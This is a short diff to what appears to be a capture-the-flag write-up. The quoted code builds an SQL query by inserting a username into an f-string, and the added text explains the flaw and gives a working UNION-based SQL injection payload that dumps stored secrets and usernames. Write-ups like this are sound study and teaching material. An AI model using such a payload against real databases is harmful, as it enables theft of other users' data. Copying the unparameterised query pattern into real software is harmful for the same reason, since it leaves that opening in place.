@@ -24,4 +24,9 @@ cur.execute(f'SELECT * FROM shporas WHERE owner = "{g.username}"')
 shporas = cur.fetchall()
 ```
 
-Username just gets
+Username just gets inserted into SQL query, which means that we can use following
+username to dump all secrets and usernames from database:
+
+```
+" UNION SELECT 1, 1, content, 1, 1, 1, 1 FROM shporas UNION SELECT 1, 1, username, 1, 1, 1, 1 FROM users; --
+```
